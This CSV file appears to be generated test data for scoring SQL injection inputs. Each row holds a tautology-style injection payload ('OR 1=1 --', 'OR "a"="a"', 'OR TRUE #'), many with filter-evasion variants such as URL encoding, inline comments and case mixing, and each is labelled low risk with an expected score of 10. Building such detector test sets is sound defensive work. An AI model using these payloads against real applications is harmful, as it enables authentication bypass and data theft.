Query,Risk Level,Expected Score
"""/**/OR/**/""a""=""a""/**/--/**/bIpUmgTusE",low,10
""" || ""A""=""A""",low,10
""" || ""a""=""a"" /* test */",low,10
""" OR ""a""=""a"" # comment",low,10
""" OR ""a""=""a"" -- nKNQxh",low,10
""" OR ""A""=""A"" # MYSQL COMMENT",low,10
""" OR ""A""=""a""",low,10
""" OR ""a""=""a"" # aLYTV",low,10
"""%20or%20""a""=""a""",low,10
""" OR ""a""=""a"" # ncxhdNk",low,10
"""/**/OR/**/""a""=""a""/**/--/**/comment/**/#/**/HNkTpa",low,10
"""+or+""a""=""a"" -- PGcvZQO",low,10
""" OR ""A""=""A"" # MySQL comment",low,10
""" OR ""a""=""a"" -- comment -- MAzlnfJ",low,10
""" OR ""a""=""a"" -- KUBIh -- comment",low,10
"""%20or%20""a""=""a"" # kTjFFVmf",low,10
""" oR ""a""=""A""",low,10
""" oR ""A""=""A""",low,10
""" OR ""a""=""a"" # dnWAjkrMPb",low,10
""" OR ""a""=""a"" -- teDyjdJZap",low,10
"""/**/OR/**/""A""=""A""/**/--/**/RCSFRAFFC",low,10
"""+or+""A""=""A""",low,10
""" Or ""A""=""A""",low,10
"""+OR+""a""=""a"" /* test */",low,10
""" OR ""a""=""a"" -- AtvZSEbDk # KsMnwev",low,10
""" OR ""a""=""a"" -- TjAzzQ",low,10
""" or ""a""=""a"" /* test */ -- ejkECZ",low,10
"""/**/OR/**/""a""=""a""/**/#/**/MySQL/**/comment",low,10
"""%20OR%20""a""=""a"" # mGjXXTYMJ",low,10
"""%20OR%20""A""=""a""",low,10
"""%20OR%20""A""=""A""",low,10
"""/**/OR/**/""A""=""A"" # NjkZJMkf",low,10
""" OR ""a""=""a"" # whExNETB",low,10
"""/**/or/**/""A""=""A""",low,10
"""	OR	""a""=""a"" # VDHcXYBj # MySQL comment",low,10
""" OR ""a""=""a"" # MySQL comment /* test */",low,10
""" OR ""a""=""a"" # xlHPHgU",low,10
"""/**/oR/**/""A""=""A""",low,10
""" || ""a""=""a"" -- comment",low,10
"""	or	""A""=""A""",low,10
""" OR ""a""=""a"" -- Xwegmrx",low,10
"""+OR+""a""=""a"" -- comment /* test */",low,10
""" OR ""a""=""a"" # mqLVwHK",low,10
""" OR ""a""=""A"" # MYSqL COMMEnt",low,10
""" || ""A""=""A"" -- CpcZKy",low,10
"""+Or+""A""=""a""+#+mYsQL+CommenT",low,10
"""  OR  ""A""=""A""",low,10
"""	OR	""A""=""A""",low,10
""" OR ""a""=""a"" -- xpYzcGym # kHstigdrlL",low,10
"""/**/or/**/""A""=""A""/**//*/**/TEST/**/*/",low,10
"""/**/OR/**/""a""=""a"" # QuCBiatf",low,10
""" OR ""a""=""a"" # LNuXhESqv",low,10
""" OR ""a""=""a"" # RngNwsrt",low,10
""" OR ""a""=""a"" # ofOzg",low,10
"""  OR  ""a""=""a""",low,10
"""/**/or/**/""a""=""a""",low,10
""" OR ""a""=""a"" -- JZwhob -- comment",low,10
""" or ""A""=""A"" # mYsql COMMENT -- wOIwTs",low,10
"""	OR	""a""=""a"" -- gXpXaZHE",low,10
""" || ""a""=""a"" # eFmjKqj # MySQL comment",low,10
"""+OR+""a""=""a""+--+comment+--+comment",low,10
"""%20or%20""A""=""A""%20#%20MySQL%20comment",low,10
""" || ""a""=""a"" # bogtP -- comment",low,10
"""	oR	""a""=""a"" # iGdDstn",low,10
"""/**/OR/**/""a""=""a"" -- comment -- comment",low,10
""" OR ""a""=""a"" -- VtDUrY /* test */",low,10
"""	Or	""A""=""A"" -- comment /* test */",low,10
"""%20or%20""A""=""A""",low,10
"""	OR	""a""=""a""	--	ZAElJ # MySQL comment",low,10
""" or ""a""=""A""",low,10
"""  or  ""A""=""A"" # GomOI",low,10
"""	OR	""a""=""a""%20--%20ZsyMvzRse%20--%20cirxTe",low,10
"""+||+""A""=""A""+--+JVJHCEZA",low,10
""" OR ""a""=""a"" # kCbHiZSV",low,10
"""/**/OR/**/""a""=""a"" -- comment",low,10
"""%20OR%20""A""=""A""%20--%20JARGNXUYZ",low,10
"""	OR	""a""=""a""	#	CTMGRwhw	/*	test	*/	#	NVDmhCtX",low,10
""" OR ""a""=""a"" # YZxVyR",low,10
""" OR ""a""=""a"" # llDzzPk /* test */",low,10
""" || ""a""=""A"" # MySQL comment",low,10
"""+or+""a""=""a"" -- fjvtlboqfr /* test */",low,10
"""+or+""A""=""A"" -- hGYTNTq",low,10
"""	oR	""A""=""A""",low,10
""" OR ""a""=""a"" -- comment -- AZHaqZM",low,10
"""/**/OR/**/""a""=""a""/**/#/**/KrooZFcN/**/--/**/yrqMlh/**/#/**/MySQL/**/comment",low,10
""" or ""a""=""a"" -- comment",low,10
""" Or ""a""=""a"" # MySQL comment",low,10
"""/**/oR/**/""A""=""A""/**/#/**/mysQL/**/coMMEnT",low,10
"""+OR+""a""=""a""+--+comment /* test */",low,10
"""%20OR%20""a""=""a"" /* test */ # gIXHTb",low,10
""" OR ""A""=""A"" -- COMMENT # PFUMSBTVD -- CFJmW",low,10
""" or ""a""=""a"" -- GodNXqwA",low,10
"""	||	""a""=""a""",low,10
""" or ""A""=""A"" -- rbaDhWlrfQ",low,10
""" oR ""A""=""A"" -- qFhvXeiEB",low,10
""" or ""A""=""A"" # ZsWzLHtQ -- COMMENT",low,10
"""	||	""a""=""a"" # MySQL comment",low,10
""" OR ""a""=""a"" /* test */ # MySQL comment",low,10
"""	OR	""a""=""a""	--	comment+#+NqpKau # MySQL comment",low,10
"""%20oR%20""a""=""a""%20/*%20tesT%20*/ /* test */",low,10
"""+||+""a""=""a""+#+MySQL+comment",low,10
"""/**/||/**/""A""=""A""/**/--/**/comment",low,10
"""%20OR%20""a""=""a""/**/#/**/MySQL/**/comment",low,10
""" || ""a""=""a"" -- mfYpjrJ",low,10
""" or ""a""=""a"" # mysql comment",low,10
"""%20OR%20""a""=""a""%20#%20comment",low,10
"""%20oR%20""a""=""A""",low,10
""" OR ""A""=""A"" # XMQUGR -- mwvuneBK",low,10
"""	oR	""a""=""A""	/*	tEsT	*/",low,10
""" OR ""A""=""A"" -- QSUAH",low,10
""" OR ""a""=""a"" # JzkokO",low,10
"""+||+""a""=""a""+#+ZirCeYCbJ",low,10
""" OR ""a""=""a"" -- EeOlvMhIs # MySQL comment",low,10
"""%20||%20""a""=""a""%20#%20MDjxNR",low,10
"""+OR+""a""=""a""	--	aRLPIjl",low,10
""" || ""A""=""A"" # MySQL comment",low,10
"""%20OR%20""a""=""a""%20/*%20test%20*/ /* test */",low,10
""" OR ""a""=""a"" -- comment # MySQL comment",low,10
""" OR ""a""=""a"" # MYSQl COmmEnT",low,10
"""/**//**/OR/**//**/""a""=""a"" # MySQL comment /* test */ /* test */",low,10
""" OR ""a""=""a"" /* test */ -- pauwkUzMb",low,10
""" || ""a""=""a"" # poOgdRQ -- comment",low,10
""" || ""a""=""a"" -- comment -- pTcPcFve",low,10
"""%20%20OR%20%20""a""=""a""",low,10
"""+or+""a""=""a""+--+comment -- comment",low,10
""" OR ""a""=""a"" -- dUAJvpZlZe",low,10
"""+||+""a""=""a"" # JgmBDIE",low,10
"""+oR+""a""=""a""",low,10
"""+Or+""A""=""A"" # ggCiNs",low,10
"""	OR	""a""=""a"" /* test */",low,10
"""  OR  ""a""=""a"" -- mkltlq # SQhouhggy /* test */",low,10
""" or ""A""=""A"" -- UGBQWH -- comment",low,10
"""/**/OR/**/""a""=""a""/**//*/**/test/**/*/",low,10
""" oR ""a""=""a"" -- comment",low,10
""" || ""a""=""A"" # MySQl cOmmeNt -- KZUQGkIPf",low,10
"""+oR+""A""=""a""+#+wJZec",low,10
""" or ""A""=""A"" -- hPkXGcsjg # MySQL comment # MySQL comment",low,10
"""/**/OR/**/""a""=""a"" # mlZXewZVRw -- comment",low,10
"""	or	""A""=""A""	--	zDIdubILbz",low,10
""" or ""a""=""a"" # eZqoKNSRJ",low,10
""" OR ""a""=""a"" -- pSaKh",low,10
""" oR ""a""=""A"" /* test */",low,10
"""%20OR%20""a""=""a""%20#%20TzgTOhZYXQ%20--%20TYKyu",low,10
""" OR ""a""=""A"" # EpxsyLHHJ",low,10
""" || ""a""=""a"" -- COmMeNt # MySQL comment",low,10
"""+OR+""a""=""a""+#+tXGEJBcxX",low,10
"""%20OR%20""a""=""a""%20#%20yXmTYLtu",low,10
""" OR ""A""=""A"" -- COMMENT /* TEST */ /* TEST */",low,10
""" OR ""a""=""a"" /* test */ -- vaLjl",low,10
"""%20||%20""a""=""a""%20--%20comment%20--%20vjrkUqZJu",low,10
"""+||+""a""=""a"" -- ZvmvZC",low,10
"""%20OR%20""a""=""a""%20--%20comment # GKDqAGJtyS",low,10
""" or ""A""=""A"" /* test */",low,10
""" OR ""a""=""a"" # MySQL comment -- mRiEnTPld /* test */",low,10
""" OR ""A""=""A"" -- comment -- WKaqLT",low,10
"""/**/OR/**/""a""=""a"" # liVjhWtpCF",low,10
"""/**/OR/**/""a""=""a""/**/--/**/ylPOcJnKi/**//*/**/test/**/*/",low,10
""" or ""A""=""A"" -- CYHRTxfd /* test */",low,10
"""/**/OR/**/""a""=""a"" /* test */ /* test */",low,10
""" OR ""a""=""a"" # tKRfMI /* test */",low,10
""" OR ""a""=""a"" # OmFoZP /* test */ -- comment",low,10
"""%20OR%20""a""=""a"" /* test */",low,10
""" OR ""a""=""a"" # jYXaazu",low,10
""" OR ""a""=""a"" # HMelEaeN -- comment",low,10
"""%20OR%20""a""=""a"" -- GZTtD -- comment",low,10
""" or ""A""=""A"" -- wTMjJvQ",low,10
"""/**/||/**/""a""=""a""	--	CsinT",low,10
"""/**/Or/**/""A""=""A""",low,10
""" OR ""A""=""A"" # ZPQDMA",low,10
""" OR ""A""=""A"" -- TIQZOH /* test */ -- comment",low,10
"""%20OR%20""a""=""a""%20#%20MySQL%20comment",low,10
"""%20OR%20""a""=""a""%20#%20LWepdSvxj%20#%20TrrcwTd",low,10
"""  ||  ""a""=""a"" /* test */ /* test */",low,10
""" or ""A""=""A"" -- comment",low,10
"""/**/or/**/""A""=""A"" -- comment /* test */",low,10
"""%20OR%20""a""=""a"" # MySQL comment",low,10
"""++or++""a""=""a""",low,10
"""%20OR%20""a""=""a"" # ZnmIE",low,10
""" || ""A""=""A"" # YcKZaFty",low,10
""" or ""A""=""A"" # BwvElWGS",low,10
""" || ""A""=""a"" /* tEST */",low,10
"""/**//**/OR/**//**/""a""=""a"" # MySQL comment",low,10
"""/**/OR/**/""a""=""a""%20#%20TzEsqMpnK",low,10
"""/**/or/**/""A""=""a""",low,10
"""	OR	""a""=""a""	#	comment",low,10
""" || ""a""=""a"" # DdBkEZ",low,10
"""	or	""A""=""A""	/*	test	*/",low,10
"""/**/||/**/""a""=""a"" # MySQL comment",low,10
"""	or	""a""=""a"" /* test */",low,10
"""%20OR%20""A""=""A"" # MySQL comment",low,10
"""	OR	""a""=""a"" # MySQL comment",low,10
""" OR ""A""=""A"" /* test */",low,10
""" or ""A""=""A"" -- COMMENT",low,10
""" or ""A""=""A"" # mYsql COMMENT",low,10
"""/**/OR/**/""a""=""a""/**/#/**/MySQL/**/comment /* test */",low,10
""" OR ""A""=""A"" -- COMMENT",low,10
"""/**/||/**/""A""=""A""",low,10
""" OR ""a""=""a"" # qNbLXt",low,10
"""	oR	""a""=""A""",low,10
""" oR ""a""=""A"" # MySQL comment",low,10
""" OR ""a""=""a"" # QmXiwmE",low,10
OR 1=1 --,low,10
OR%201=1%20--,low,10
OR	1=1	#,low,10
or%201=1%20--,low,10
OR+1=1+--+#+MySQL+comment+#+MySQL+comment,low,10
OR  1=1  # -- comment,low,10
OR  1=1  --,low,10
OR/**/1=1/**/--,low,10
OR	1=1	--,low,10
OR 1=1 #,low,10
OR%201=1%20-- /* test */ # BtIzC,low,10
OR 1=1 -- /* test */,low,10
OR 1=1 -- -- comment,low,10
OR	1=1	-- # Mbgfenv,low,10
|| 1=1 --,low,10
|| 1=1 -- -- comment,low,10
OR+1=1+-- -- comment,low,10
OR+1=1+--,low,10
or 1=1 --,low,10
|| 1=1 -- -- IMdtUC,low,10
OR+1=1+--+#+MySQL+comment,low,10
OR%201=1%20--%20--%20comment,low,10
OR/**/1=1/**/--/**/--/**/QUSWRLjSYn,low,10
or 1=1 -- /* teSt */,low,10
OR	1=1	--	--	yqOGTWCcO,low,10
OR 1=1 -- # aOXJjbb,low,10
OR 1=1 -- # pWndgSFGdS # MySQL comment,low,10
OR%201=1%20-- # MySQL comment,low,10
OR%201=1%20--%20/*%20test%20*/,low,10
OR 1=1 -- # MySQL comment,low,10
OR/**/1=1/**/#,low,10
OR 1=1 -- -- COMMENT,low,10
OR 1=1 # # comment # EdChc,low,10
or 1=1 -- # mysql comment,low,10
||%201=1%20--,low,10
oR 1=1 -- # ihXfkyt,low,10
OR+1=1+-- -- comment -- comment,low,10
OR 1=1 -- -- leENGiLoXh,low,10
Or 1=1 --,low,10
OR%201=1%20-- /* test */,low,10
OR 1=1 # # MySQL comment,low,10
or%201=1%20-- # xYTknK,low,10
OR/**/1=1/**/--/**//*/**/test/**/*/,low,10
OR	1=1	--	#	MySQL	comment,low,10
OR	1=1	-- # MySQL comment,low,10
|| 1=1 -- # MySQL comment,low,10
or 1=1 -- # mYsql COMMENT,low,10
OR 1=1 -- -- ntJAdoOZ,low,10
or 1=1 -- /* test */,low,10
||	1=1	--,low,10
OR 1=1 -- /* test */ /* test */,low,10
oR 1=1 --,low,10
or 1=1 -- /* TEST */,low,10
or 1=1 -- -- comment -- GocBx,low,10
OR/**/1=1/**/--/**/--/**/comment,low,10
oR 1=1 -- -- CommenT,low,10
OR 1=1 -- # EzEgpg,low,10
OR+1=1+--+#+MYSQL+COMMENT,low,10
oR%201=1%20-- -- IfyhaSIino,low,10
OR 1=1 -- # HVovFuxDmY,low,10
|| 1=1 -- # kRnUnTTxz -- comment,low,10
|| 1=1 #,low,10
OR	1=1	-- -- comment,low,10
OR%201=1%20--%20#%20LfSFhQp,low,10
OR 1=1 # /* tesT */,low,10
OR	1=1	--	--	HbODVxrZr,low,10
OR 1=1 -- -- soxOXcQbtH,low,10
|| 1=1 -- -- WKCmY -- feLdiNLj,low,10
Or+1=1+--,low,10
OR/**/1=1/**/-- # MySQL comment,low,10
OR+1=1+-- -- comment # ckhSijvX,low,10
OR 1=1 -- -- KpYprubRry,low,10
or 1=1 #,low,10
or 1=1 # # uZxINyS,low,10
OR+1=1+--  #  MySQL  comment,low,10
or+1=1+--,low,10
OR 1=1 -- /* test */ -- NHYrPUE,low,10
OR	1=1	--	#	HsSuS,low,10
OR/**/1=1/**/--/**/--/**/huZRVqw,low,10
or/**/1=1/**/--,low,10
OR	1=1	--+#+MySQL+comment,low,10
OR/**/1=1/**/--/**//*/**/test/**/*/%20--%20comment /* test */,low,10
OR+1=1+-- /* test */,low,10
OR	1=1	--	--	FUwNUEZeVm	--	TcHcB	/*	test	*/,low,10
oR/**/1=1/**/--,low,10
OR 1=1 # # PwmIscghu # PStGs # xZUNPdYo # comment,low,10
OR+1=1+#,low,10
or%201=1%20--/**/#/**/MySQL/**/comment,low,10
OR%201=1%20#,low,10
Or	1=1	--,low,10
or+1=1+--+#+OUXZENz,low,10
|| 1=1 -- -- comment # MySQL comment /* test */,low,10
OR+1=1+-- -- WOKBG,low,10
OR 1=1 -- # MYsql ComMEnt /* test */,low,10
or 1=1 -- -- amzwVApgL -- comment,low,10
or/**/1=1/**/-- /* test */,low,10
OR+1=1+--	--	comment,low,10
OR 1=1 -- /* test */ # iuJGbaBeJ,low,10
OR/**/1=1/**/--/**/#/**/MySQL/**/comment/**/--/**/vWQGpTbU,low,10
||+1=1+# -- kQgDrefqm,low,10
or%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
OR+1=1+# /* test */,low,10
OR 1=1 -- /* test */ -- wCVwSqjEv,low,10
or+1=1+--+--+pyibmlotfx,low,10
OR 1=1 -- -- ZCPDSuOT # vXptKNC,low,10
oR 1=1 -- # MySql commenT,low,10
oR%201=1%20--,low,10
OR 1=1 -- /* test */ -- comment,low,10
OR/**/1=1/**/-- /* test */,low,10
OR+1=1+-- -- pddXYlZP,low,10
||+1=1+-- -- Wstzoxo,low,10
||+1=1+# # MySQL comment,low,10
OR 1=1 # # OOPZKL /* test */,low,10
oR 1=1 # /* TESt */,low,10
oR 1=1 -- -- Swdtxyr,low,10
or 1=1 -- -- comment # MySQL comment,low,10
oR+1=1+--,low,10
|| 1=1 # # MySQL comment,low,10
or%201=1%20#,low,10
oR+1=1+--+#+MySQl+cOMMeNT,low,10
or%201=1%20-- # MySQL comment,low,10
OR+1=1+--+--+comment,low,10
OR%201=1%20--%20--%20comment%20/*%20test%20*/,low,10
Or 1=1 -- -- comment,low,10
OR/**/1=1/**/--%20--%20comment,low,10
OR 1=1 -- # flvCDpVQup -- comment,low,10
or 1=1 -- # lsQLD,low,10
or 1=1 -- # qOpcC,low,10
OR 1=1 # -- comment,low,10
OR 1=1 -- # YIKFKRNCRT,low,10
||%201=1%20--%20#%20MySQL%20comment,low,10
OR+1=1+--+/*+test+*/+--+comment,low,10
OR 1=1 -- # XUWPVVOEK # QNVCC,low,10
oR%201=1%20-- # cyoszUyV,low,10
OR 1=1 -- # ruwkafzy -- COMment,low,10
OR/**/1=1/**/-- -- lSngebZhP,low,10
||+1=1+--+--+UHxESQcqt,low,10
OR	1=1	--/**/#/**/MySQL/**/comment,low,10
or+1=1+--+#+urphpaf,low,10
|| 1=1 -- # rDTCKyTCZT,low,10
OR+1=1+--+--+twLOjXDR+--+comment+--+comment,low,10
OR	1=1	--	/*	test	*/ -- EewkDgqjN,low,10
OR+1=1+#+#+coMMenT,low,10
OR%201=1%20# /* test */,low,10
or 1=1 -- -- snebkl # MySQL comment,low,10
or%201=1%20-- /* test */,low,10
Or 1=1 -- -- NPNoKOa,low,10
or 1=1 -- /* test */ # jpgsskkraa,low,10
OR/**/1=1/**/-- # MySQL comment -- comment,low,10
OR 1=1 -- # NTNTPD # MYSQL COMMENT -- rYWyGHoc,low,10
OR  1=1  -- -- nPkWsj,low,10
Or 1=1 -- # MysqL COMment,low,10
OR	1=1	-- /* test */,low,10
or+1=1+#,low,10
or	1=1	--	/*	test	*/,low,10
OR/**/1=1/**/-- # DUDIDIW,low,10
or 1=1 # # COMMENT,low,10
OR%201=1%20# -- zmCiuLMh,low,10
or 1=1 -- /* TEST */ /* test */,low,10
Or 1=1 #,low,10
OR+1=1+--+/*+TEST+*/,low,10
OR	1=1	--%20/*%20test%20*/,low,10
OR 1=1 -- -- LouHvkuXyo,low,10
oR 1=1 # # LvZHtAQ -- comment # jYuao,low,10
or 1=1 -- -- comment,low,10
OR 1=1 -- # RUrcUPo /* test */,low,10
oR 1=1 -- # DtJMXBaJ -- mKIZpM,low,10
OR%201=1%20--%20#%20XyBrMP,low,10
OR%201=1%20--%20--%20ttrKcq%20--%20LuRAeOAq,low,10
or	1=1	--	#	rtlctf # geiEXlclKg,low,10
OR 1=1 -- /* test */ # MySQL comment,low,10
OR+1=1+--+--+COMMENT,low,10
||+1=1+--+--+comment -- comment -- BJYgVQMAU,low,10
OR/**/1=1/**/--/**/--/**/comment -- comment,low,10
OR 1=1 -- # MySQL comment -- ABHSRmY -- bdLWrHR # MySQL comment,low,10
or 1=1 -- # HhXnJvmt,low,10
OR	1=1	--	--	comment,low,10
OR+1=1+--	--	mSfvULPke,low,10
|| 1=1 -- # MySQL comment -- comment,low,10
or 1=1 -- # MySQL comment /* test */,low,10
OR+1=1+-- # tBptsrUk /* test */ -- comment,low,10
OR 1=1 -- -- BzWkCUpQJ,low,10
OR 1=1 # # aQmSKgwhZD,low,10
or 1=1 # /* test */,low,10
or 1=1 -- # zwVbj,low,10
oR/**/1=1/**/--/**/--/**/commENT/**/--/**/DKHCJs,low,10
OR  1=1  --  #  uiQPM,low,10
|| 1=1 -- /* test */,low,10
OR/**/1=1/**/--/**/--/**/comment # MySQL comment,low,10
Or+1=1+#,low,10
or	1=1	--,low,10
OR+1=1+#+#+oGipXekQf,low,10
OR 1=1 -- # vjAOIGkEr,low,10
OR+1=1+--+--+comment+#+FpTgWLC,low,10
Or%201=1%20--,low,10
or 1=1 # # CFktmKwKd,low,10
OR/**/1=1/**/--/**/--/**/EiXXS,low,10
or/**/1=1/**/-- -- comment,low,10
|| 1=1 -- # YCnHncsHf,low,10
OR 1=1 -- # MySQL comment # KWyYt -- comment,low,10
or/**/1=1/**/--/**/#/**/YBnBOEBlz,low,10
OR%201=1%20--%20#%20mySql%20ComMent,low,10
OR+1=1+--+--+yuXiTuIW,low,10
or 1=1 -- # MySQL comment,low,10
or 1=1 -- -- COMMENT -- jtxNJHckb,low,10
OR 1=1 -- /* test */ -- YYnimKf,low,10
Or 1=1 -- # mYsqL cOmMent -- coMMENt,low,10
OR%201=1%20--%20#%20MySQL%20comment,low,10
OR	1=1	--	--	COMMENT,low,10
OR%201=1%20-- # KNFJiL,low,10
||/**/1=1/**/--,low,10
||%201=1%20--/**/--/**/iGBfGtfhda,low,10
OR 1=1 -- # aFBoWIYyA,low,10
or+1=1+--+/*+test+*/,low,10
OR 1=1 -- -- comment /* test */ -- comment,low,10
OR+1=1+--+#+BGQtRhqTiK,low,10
OR	1=1	-- -- ueLOLBstC,low,10
Or%201=1%20-- -- dWgCFo,low,10
OR%201=1%20--%20--%20dgDDhrjDD%20--%20KGrsGmls,low,10
or	1=1	-- # LxvOl,low,10
or/**/1=1/**/-- -- wdXmSRvDZD -- comment,low,10
OR 1=1 # -- dLiEaxFrlj,low,10
||%201=1%20--%20--%20comment,low,10
OR	1=1	--	#	SusIcxEiZt # MySQL comment,low,10
OR 1=1 -- -- ikfOQX -- CuqUHUWJhY # gevtzzXmlf,low,10
||+1=1+--+#+MySQL+comment+--+zOgkP,low,10
or%201=1%20--%20#%20uwxhnjk,low,10
or	1=1	--	/*	test	*/ /* test */,low,10
||+1=1+# /* test */,low,10
oR 1=1 -- -- comMent # mySqL CoMmENt -- BkHBPxFFuK,low,10
OR+1=1+-- # MYSQL COMMENT,low,10
OR 1=1 -- # hVCDtHOKL,low,10
OR/**/1=1/**/-- /* test */ -- wrGfHcmKk,low,10
OR	1=1	--	/*	test	*/,low,10
or+1=1+-- # mirKZuZxm,low,10
OR 1=1 -- # MySQL comment # NnxqSxM /* test */,low,10
OR+1=1+-- # MySQL comment,low,10
|| 1=1 -- # BRYnxa # VuyfAQ,low,10
or 1=1 -- # MYSqL comMEnT,low,10
OR 1=1 -- # HGSPBHY -- comment,low,10
|| 1=1 -- -- hZjYAqkyq -- sjzleTHq,low,10
OR+1=1+--%20/*%20test%20*/,low,10
OR 1=1 -- # MySQL comment /* test */,low,10
or	1=1	-- -- comment,low,10
||	1=1	--	--	SVMzuVqMz,low,10
OR 1=1 -- -- WRJKG,low,10
OR	1=1	--+#+KHTNFDdFBn,low,10
Or+1=1+--+#+mmFMmX,low,10
||%201=1%20-- -- yNEcGHSVK,low,10
OR 1=1 -- # tvDEno,low,10
OR TRUE --,low,10
|| TRUE -- /* test */,low,10
OR	TRUE	--,low,10
OR	TRUE	--	#	aRwQTHHj,low,10
|| true --,low,10
OR	TRUE	--	/*	test	*/,low,10
|| TRUE --,low,10
OR+TRUE+--,low,10
OR/**/TRUE/**/--,low,10
OR TRUE #,low,10
OR TRUE -- -- wMAlCs,low,10
OR		TRUE		-- # MySQL comment,low,10
OR	TRUE	# -- wmmizLVtsY,low,10
OR	TRUE	-- # MySQL comment,low,10
||%20TRUE%20--,low,10
or true --,low,10
or true -- -- COMMENT,low,10
or true -- # MySQL comment,low,10
OR TRUE -- # RIBjuThkY,low,10
OR%20TRUE%20--,low,10
or+true+--+#+MySQL+comment,low,10
OR TRUE -- /* test */,low,10
OR TRUE -- -- gzkVCdmY,low,10
OR TRUE -- # nOOXUF,low,10
or tRuE --,low,10
OR TRUE # /* test */,low,10
OR TRUE -- # MySQL comment,low,10
OR true --,low,10
OR TRUE -- # sgAczcu,low,10
OR TRUE -- -- comment,low,10
OR TRUE # -- DufGrMfJ,low,10
OR TRUE -- # DDsGre,low,10
or	true	--,low,10
OR TRUE -- -- comment -- comment,low,10
OR	TRUE	--	--	grrmdYh,low,10
OR+TRUE+--+/*+test+*/,low,10
or/**/true/**/--,low,10
OR TRUE -- # MySQL comment -- comment,low,10
|| TRUE -- # MySQL comment,low,10
OR TrUE --,low,10
OR TRUE -- -- comment /* test */ # PbdLlEec,low,10
|| TRUE -- -- comment,low,10
OR+TRUE+-- -- sGkIq,low,10
OR/**/TRUE/**/-- -- tsErFM,low,10
OR%20TRUE%20-- /* test */ -- OiYZwDL,low,10
OR TRUE -- -- dSsykSYalu,low,10
or+true+--,low,10
||%20TRUE%20-- # MySQL comment,low,10
OR+TRUE+-- # WeZvmv,low,10
OR	TRUE	--	/*	test	*/ -- comment,low,10
or%20true%20#,low,10
or true -- # mYsql COMMENT,low,10
||	TRUE	--,low,10
OR TRUE -- /* test */ # OPtUfbLPw,low,10
OR	TRUE	--	--	comment,low,10
OR/**/TRUE/**/--%20--%20PwVeJ,low,10
or true -- /* test */,low,10
oR TrUe --,low,10
OR+tRUe+--,low,10
OR%20TRUE%20--%20--%20bQQQeXvp,low,10
OR TRUE -- -- iUXoLucLM,low,10
Or%20TRuE%20--,low,10
OR TruE --,low,10
OR/**/TRUE/**/--/**/#/**/MySQL/**/comment,low,10
or true -- -- iqyyfp /* test */,low,10
||%20TRUE%20--%20#%20WokOaTRy,low,10
OR/**/TRUE/**/#,low,10
OR+TRUE+--+#+NRgrM # MySQL comment,low,10
OR%20TRUE%20#,low,10
OR%20TRUE%20-- -- comment,low,10
OR TRUE -- -- COMMENT,low,10
OR TRUE -- # CFlMfMfM,low,10
OR TRUE -- -- yTPRnLqaJT,low,10
OR TRUE # -- comment,low,10
OR/**/tRue/**/--,low,10
OR TRUE -- # jOsJzT -- WxsOujsn,low,10
or true #,low,10
OR+TRUE+-- # mOoel,low,10
OR TRUE -- # cuDFu -- comment,low,10
OR/**/TRUE/**/--/**//*/**/test/**/*/ # kaUcn,low,10
OR TRUE # # MySQL comment,low,10
OR  TRUE  --,low,10
OR TRUE -- /* TEST */ # klDlaPpqVz,low,10
oR TRuE -- # nZnuWtQ,low,10
OR+TRUE+--+#+MySQL+comment,low,10
or true -- -- comment,low,10
OR true -- -- SLpkT,low,10
Or truE --,low,10
OR tRuE -- # cNGLnsDn,low,10
|| TRUE #,low,10
OR TRUE -- -- QLhNnkPn,low,10
or	tRUE	--,low,10
|| TRuE --,low,10
OR	TRUE	--	#	PNWSECXWC,low,10
OR/**/TRUE/**/-- -- comment,low,10
OR	true	--,low,10
or true -- # mysql comment,low,10
OR True --,low,10
OR TRUE -- # MySQL comment # cpuLqR # HcChAZsy,low,10
OR/**/TRUE/**/--/**/--/**/PXpktQ,low,10
Or	tRue	-- # MySQL comment,low,10
Or%20TRUe%20#,low,10
OR TRUE -- -- comment # MySQL comment,low,10
OR/**/TRUE/**/-- /* test */,low,10
OR tRuE -- -- ComMeNT # NqDqSN,low,10
or	true	--	#	rekfdkex	#	mysql	comment,low,10
OR TRUE -- -- Rphpnyxpm /* test */ -- comment,low,10
OR%20TRUE%20#%20--%20nJGUnp,low,10
OR%20TRUE%20-- # iMpUP,low,10
OR+TRUE+-- -- AViZjnEJVy /* test */,low,10
or/**/true/**/-- -- mOYhG # XBYqjaPmS,low,10
OR/**/TRUE/**/--/**/#/**/uBKUJGMC,low,10
OR  TRUE  --  #  MySQL  comment,low,10
or  true  -- # FlWEdPtn,low,10
OR TRUE -- -- ZDAGUA,low,10
or true -- -- awcgw,low,10
OR+TRUE+-- # MySQL comment /* test */,low,10
